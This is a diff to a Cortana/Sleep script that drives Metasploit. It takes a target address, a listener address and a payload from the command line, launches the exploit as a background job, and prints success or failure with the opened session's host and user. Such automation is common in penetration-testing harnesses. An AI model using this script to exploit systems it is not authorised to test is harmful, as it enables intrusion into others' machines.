@@ -11,12 +11,12 @@ command cmdline_arg {
    $attack = "exploit/" . $1;
 
    $payload = determinePayload($4);
-   println("$payload");
 
    cmd($console, "use $attack");
    cmd($console, "set rhost $2");
    cmd($console, "set lhost $3");
    cmd($console, "set payload $payload");
+   cmd($console, "set target 0");
    cmd($console, "exploit -j");
 }
 
@@ -28,13 +28,26 @@ sub determinePayload {
 }
 
 on session_open {
-   local('$flag $host $user $sessionNum $session');
-   $session = $2;
-   println("Session open: $1 $2");
-   println("$session['host'], $session['user']");
+   local('$flag $host $user $sessionNum %r');
+   %r = $2;
+   $flag = "success";
+   #println("Session open: $1 => $2");
+   $sessionNum = $1;
+   $host = %r["host"];
+   $user = %r["username"];
+   println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
    quit();
 }
 
-on console_exploit {
-   println("Exploit: $1 $2 $3");
+on heartbeat_15s {
+   local('$flag $host $user $sessionNum $console @jobid');
+   $console = console();
+   $flag = "failure";
+   $sessionNum = "0";
+   $host = "";
+   $user = "";
+   @jobid = job_ids();
+   println(@jobid);
+   println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
+   quit();
 }
